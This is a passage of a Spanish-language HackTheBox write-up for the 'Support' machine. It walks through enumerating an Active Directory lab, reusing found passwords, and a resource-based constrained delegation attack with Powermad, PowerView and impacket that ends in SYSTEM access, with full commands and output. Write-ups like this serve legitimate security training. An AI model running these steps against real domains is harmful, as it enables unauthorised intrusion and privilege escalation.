+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.11.174    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span>
+HTTP        10.10.11.174    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.174:5985/wsman
+WINRM       10.10.11.174    5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>dap:nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
+</code></pre></div></div>
+
+<p>Las credenciales son validas para <code class="language-plaintext highlighter-rouge">smb</code> pero no es una cuenta con privilegios</p>
+
+<h2 id="rcpclient-enum-with-creds">RCPCLIENT ENUM (WITH CREDS)</h2>
+
+<p>Ahora tenemos lo necesario para extraer usuarios del controlador de dominio por medio de las credenciales validas encontradas anteriormente, adicionalmente vamos a enumerar un poco mas de información</p>
+
+<h3 id="obtener-listado-de-usuarios">OBTENER LISTADO DE USUARIOS</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.10.11.174 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> 0x | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
+</code></pre></div></div>
+
+<h3 id="grupos-administradores">GRUPOS ADMINISTRADORES</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.10.11.174 <span class="nt">-c</span> enumdomgroups
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+</code></pre></div></div>
+
+<h3 id="usuarios-administradores">USUARIOS ADMINISTRADORES</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.10.11.174 <span class="nt">-c</span> <span class="s1">'querygroupmem 0x200'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	rid:[0x1f4] attr:[0x7]
+</code></pre></div></div>
+
+<h3 id="descripción-usuario-administrator">DESCRIPCIÓN USUARIO ADMINISTRATOR</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.10.11.174 <span class="nt">-c</span> <span class="s1">'queryuser 0x1f4'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User Name   :	Administrator
+</code></pre></div></div>
+
+<h2 id="ldapsearch-ad-enum-with-creds">LDAPSEARCH AD ENUM (WITH CREDS)</h2>
+
+<p>Continuamos enumerando el directorio activo, en este caso con la utilidad <code class="language-plaintext highlighter-rouge">ldapsearch</code>, encontrando una credencial en el campo <code class="language-plaintext highlighter-rouge">info</code> perteneciente al usuario <code class="language-plaintext highlighter-rouge">support</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.11.174 <span class="nt">-D</span> <span class="s1">'ldap@support.htb'</span> <span class="nt">-w</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="nt">-b</span> <span class="s2">"DC=support,DC=htb"</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'samaccountname: support'</span> <span class="nt">-B</span> 40
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>info: Ironside47pleasure40Watchful
+</code></pre></div></div>
+
+<h2 id="validating-support-creds">VALIDATING SUPPORT CREDS</h2>
+
+<p>Vamos a validar las credenciales del usuario <code class="language-plaintext highlighter-rouge">support</code></p>
+
+<h3 id="validar-creds-smb-1">VALIDAR CREDS SMB</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.11.174 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'Ironside47pleasure40Watchful'</span> <span class="nt">--continue-on-success</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.11.174    445    DC               <span class="o">[</span>+] support.htb<span class="se">\s</span>upport:Ironside47pleasure40Watchful
+</code></pre></div></div>
+
+<h3 id="validar-creds-winrm-1">VALIDAR CREDS WINRM</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.11.174 <span class="nt">-u</span> support <span class="nt">-p</span> <span class="s1">'Ironside47pleasure40Watchful'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.11.174    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span>
+HTTP        10.10.11.174    5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.174:5985/wsman
+WINRM       10.10.11.174    5985   DC               <span class="o">[</span>+] support.htb<span class="se">\s</span>upport:Ironside47pleasure40Watchful <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Tenemos credenciales con privilegios para conectarnos de manera remota</p>
+
+<h2 id="granted-access-support-user">GRANTED ACCESS SUPPORT USER</h2>
+
+<p>Accedemos a la máquina víctima con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.174 <span class="nt">-u</span> <span class="s1">'support'</span> <span class="nt">-p</span> <span class="s1">'Ironside47pleasure40Watchful'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>support<span class="se">\s</span>upport
+</code></pre></div></div>
+
+<h2 id="ad-enum-local">AD ENUM LOCAL</h2>
+
+<p>Nos encontramos dentro de la máquina víctima, sin embargo, necesitamos escalar privilegios, por lo tanto, debemos enumerar la máquina para obtener más información que nos pueda ayudar.</p>
+
+<h3 id="usuarios-de-la-máquina">USUARIOS DE LA MÁQUINA</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-------------------------------------------------------------------------------</span>
+Administrator            anderson.damian          bardot.mary
+cromwell.gerard          daughtler.mabel          ford.victoria
+Guest                    hernandez.stanley        krbtgt
+langley.lucy             ldap                     levine.leopoldo
+monroe.david             raven.clifton            smith.rosario
+stoll.rachelle           support                  thomas.raphael
+west.laura               wilson.shelby
+</code></pre></div></div>
+
+<h3 id="grupos-y-privilegios-del-usuario-actual">GRUPOS Y PRIVILEGIOS DEL USUARIO ACTUAL</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+</code></pre></div></div>
+
+<h3 id="información-general-de-un-grupo-local">INFORMACIÓN GENERAL DE UN GRUPO LOCAL</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup <span class="s2">"Remote Management Users"</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>support
+</code></pre></div></div>
+
+<h2 id="bloodhound-enum">BLOODHOUND ENUM</h2>
+
+<p>Ahora vamos a descargar y transmitir el binario <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> a la máquina víctima para extraer la información del AD y posteriormente visualizarla en <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
+
+<h4 id="máquina-atacante">MÁQUINA ATACANTE</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>SharpHound
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>SharpHound
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv</span> ~/Descargas/SharpHound-v1.1.0.zip <span class="nb">.</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip SharpHound-v1.1.0.zip
+</code></pre></div></div>
+
+<h4 id="máquina-víctima">MÁQUINA VÍCTIMA</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>privs
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>privs
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /opt/BloodHound-linux-x64/SharpHound.exe
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\S</span>harpHound.exe <span class="nt">-c</span> All
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rivs<span class="se">\2</span>0220718205025_BloodHound.zip bloodhound.zip
+</code></pre></div></div>
+
+<h3 id="bloodhound-interaction">BLOODHOUND INTERACTION</h3>
+
+<p>Ya tenemos la información descargada en nuestro equipo, ahora procedemos a revisar la data con <code class="language-plaintext highlighter-rouge">bloodhound</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neo4j console &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># INGRESAR CREDENCIALES DE ACCESO</span>
+</code></pre></div></div>
+
+<h4 id="seguir-secuencia-en-bloodhound">SEGUIR SECUENCIA EN BLOODHOUND</h4>
+<blockquote>
+
+  <p>Upload Data &gt; bloodhound.zip &gt; Analysis &gt; Find all domain admins
+                      &gt; Find Principals with DCSync Rights &gt; Domaim</p>
+
+</blockquote>
+
+<h4 id="enumerar-grupos">ENUMERAR GRUPOS</h4>
+<blockquote>
+
+  <p>Buscar Shared support accounts&gt; node info &gt; Reachable High Value Targets</p>
+
+</blockquote>
+
+<h4 id="marcar-usuarios-pwned">MARCAR USUARIOS PWNED</h4>
+<blockquote>
+
+  <p>Buscar user &gt; mark user as owned</p>
+
+</blockquote>
+
+<h4 id="escalamiento">ESCALAMIENTO</h4>
+<blockquote>
+
+  <p>Node info &gt; Reachable High Value Targets</p>
+
+</blockquote>
+
+<p align="center">
+<img src="/assets/images/support/06-blood.png" />
+</p>
+
+<h2 id="resorce-based-constrained-delegation-rbcd-attack">RESORCE BASED CONSTRAINED DELEGATION (RBCD) ATTACK</h2>
+
+<p>Vamos a realizar un <code class="language-plaintext highlighter-rouge">RBCD ATTACK</code>, esto es posible porque el grupo <code class="language-plaintext highlighter-rouge">SHARED SUPPORT ACCOUNTS</code> tiene permisos <code class="language-plaintext highlighter-rouge">Generic all</code> sobre el <code class="language-plaintext highlighter-rouge">AD</code>, dando la libertad de ejecutar en este caso la posibilidad de crear una nueva cuenta de máquina, que puedes hacer uso del mismo para obtener un ticket impersonando el usuario obteniendo accesos privilegiados con ayuda de <code class="language-plaintext highlighter-rouge">powermad</code> y <code class="language-plaintext highlighter-rouge">powerview</code></p>
+
+<h3 id="máquina-atacante-1">MÁQUINA ATACANTE</h3>
+
+<h5 id="descargar-powermadps1-y-powerviewps1">DESCARGAR POWERMAD.PS1 Y POWERVIEW.PS1</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+</code></pre></div></div>
+
+<h3 id="máquina-víctima-1">MÁQUINA VÍCTIMA</h3>
+
+<h5 id="transferir-powermad">TRANSFERIR POWERMAD</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /home/bast1ant1c/Desktop/bast1ant1c/HTB/AD/easy/support/recon/Powermad.ps1
+</code></pre></div></div>
+<h5 id="importar-modulo">IMPORTAR MODULO</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .<span class="se">\P</span>owermad.ps1
+</code></pre></div></div>
+<h5 id="crear-cuenta-de-máquina">CREAR CUENTA DE MÁQUINA</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-MachineAccount <span class="nt">-MachineAccount</span> SERVICEA <span class="nt">-Password</span> <span class="si">$(</span>ConvertTo-SecureString <span class="s1">'password123'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span><span class="si">)</span> <span class="nt">-Verbose</span>
+</code></pre></div></div>
+
+<h5 id="transferir-powerview">TRANSFERIR POWERVIEW</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /home/bast1ant1c/Desktop/bast1ant1c/HTB/AD/easy/support/recon/PowerView.ps1
+</code></pre></div></div>
+<h5 id="importar-modulo-1">IMPORTAR MODULO</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .<span class="se">\P</span>owerView.ps1
+</code></pre></div></div>
+<h5 id="crear-condiciones-de-la-cuenta-de-máquina-para-explotación">CREAR CONDICIONES DE LA CUENTA DE MÁQUINA PARA EXPLOTACIÓN</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer SERVICEA
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ComputerSid</span> <span class="o">=</span> Get-DomainComputer SERVICEA <span class="nt">-Properties</span> objectsid | Select <span class="nt">-Expand</span> objectsid
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="nt">-ArgumentList</span> <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="nv">$ComputerSid</span><span class="s2">)"</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SDBytes</span> <span class="o">=</span> New-Object byte[] <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer dc | Set-DomainObject <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer dc <span class="nt">-Properties</span> <span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msds-allowedtoactonbehalfofotheridentity
+<span class="nt">----------------------------------------</span>
+<span class="o">{</span>1, 0, 4, 128...<span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="granted-access-administrator-user-golden-ticket">GRANTED ACCESS ADMINISTRATOR USER (GOLDEN TICKET)</h2>
+
+<p>Vamos a hacer uso de la utilidad <code class="language-plaintext highlighter-rouge">getST</code> con la que obtendremos un golden ticket del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> aprovechando la creación de la cuenta de máquina realizada en pasos anteriores, obteniendo acceso con <code class="language-plaintext highlighter-rouge">psexec</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-getST <span class="nt">-spn</span> cifs/dc.support.htb <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> 10.10.11.174 support.htb/SERVICEA<span class="nv">$:</span>password123
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2self
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2Proxy
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec <span class="nt">-k</span> dc.support.htb
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div>
+
+<h2 id="flags">FLAGS</h2>
+
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:/
+<span class="nb">dir</span> /b/s user.txt
+c:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+<span class="nb">set</span> /P <span class="nv">user</span><span class="o">=</span>&lt;<span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\s</span><span class="s2">upport</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+echo.%user:~0,10%
+ce03e32c55
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:/
+<span class="nb">dir</span> /b/s root.txt
+c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+<span class="nb">set</span> /P <span class="nv">user</span><span class="o">=</span>&lt;<span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+echo.%root:~0,10%
+4e4ed829c0
+</code></pre></div></div>
+
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">support</code> de HackTheBox!</p>
+
+<p align="center">
+<img src="/assets/images/support/07-finish.png" />
+</p>
+
+<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
+
+<p><strong>Nos vemos en otro bit.</strong></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active Directory</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#support" class="page__taxonomy-item" rel="tag">Support</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-03-15T00:00:00-05:00">March 15, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/forest/" class="pagination--pager" title="HTB forest AD
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+<!--
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+-->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" integrity="sha384-rOA1PnstxnOBLzCLMcre8ybwbTmemjzdNlILg8O7z1lUkLXozs4DHonlDtnE7fpc" crossorigin="anonymous"></script>
+  
+
+
+
+
+
+
+
+  </body>
+</html>
